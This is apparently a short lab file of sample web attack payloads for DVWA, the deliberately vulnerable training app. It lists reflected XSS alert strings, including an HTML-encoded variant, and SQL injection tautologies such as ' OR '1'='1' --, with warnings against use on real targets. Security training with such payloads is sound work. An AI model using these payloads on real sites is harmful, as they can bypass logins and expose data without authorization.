# sanitized_payloads.txt
# Example payloads (for lab use in DVWA only).
# Keep these for educational purposes. Do NOT use on real targets without authorization.

# XSS (Reflected) - simple (DVWA low)
<script>alert('XSS Exploited!');</script>

# XSS (Encoded) - if input filters < >
&lt;script&gt;alert('XSS Exploited!')&lt;/script&gt;

# SQLi - simple tautology (DVWA low)
1' OR '1'='1

# SQLi - comment to truncate query
' OR '1'='1' -- 

# Notes:
# - Never include payloads that trigger remote code execution on third-party systems.
# - If documenting scripts, include clear comments and require manual confirmation before running.
